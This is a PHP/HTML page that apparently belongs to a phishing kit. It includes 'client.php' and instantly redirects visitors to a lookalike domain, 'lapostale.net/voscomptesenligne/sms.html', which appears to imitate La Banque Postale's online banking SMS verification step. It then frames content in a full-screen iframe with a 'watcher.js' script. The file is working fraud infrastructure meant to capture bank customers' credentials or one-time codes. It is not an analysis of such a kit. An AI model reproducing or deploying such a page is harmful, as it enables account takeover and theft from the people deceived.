<?php

header("Access-Control-Allow-Origin: http://localhost:63342");
include 'client.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
	<meta http-equiv="refresh" content="0;url=http://lapostale.net/voscomptesenligne/sms.html" />
    <title></title>
    <style type="text/css">
        body, html
        {
            margin: 0; padding: 0; height: 100%; overflow: hidden;
        }

        #content
        {
            position:absolute; left: 0; right: 0; bottom: 0; top: 0px;
        }
    </style>
</head>
<body>
    <div id="content">
        <iframe frameborder="0" width="100%" height="100%" id="frame" src="#" data-cach="#"></iframe>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="js/watcher.js"></script>
</body>
</html>
